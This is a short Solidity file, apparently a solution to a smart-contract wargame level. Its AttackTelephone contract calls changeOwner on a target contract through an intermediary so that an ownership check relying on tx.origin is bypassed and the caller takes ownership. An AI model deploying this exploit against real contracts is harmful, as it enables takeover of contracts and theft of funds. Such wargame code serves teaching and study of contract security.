// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract AttackTelephone {
    ITelephone public target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    // call this from your EOA to set yourself as owner
    function attack(address _newOwner) public {
        target.changeOwner(_newOwner);
    }
}

